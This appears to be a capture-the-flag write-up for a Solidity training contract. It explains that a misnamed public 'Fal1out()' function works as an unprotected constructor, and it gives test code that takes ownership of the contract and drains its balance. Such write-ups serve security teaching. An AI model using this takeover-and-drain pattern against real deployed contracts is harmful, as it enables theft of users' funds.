# Objective

- Claim ownership of the contract

# Proof of Concept

The contract does not use the `constructor()` function, but instead a publicly accessible function named `Fal1out()`. Any account that sends some Ether to this function will be set as the new `owner` of the contract.

```solidity
falloutContract.Fal1out{value: 1 wei}();
assertEq(falloutContract.owner(), attacker);

falloutContract.collectAllocations();
assertEq(address(falloutContract).balance, 0);
```
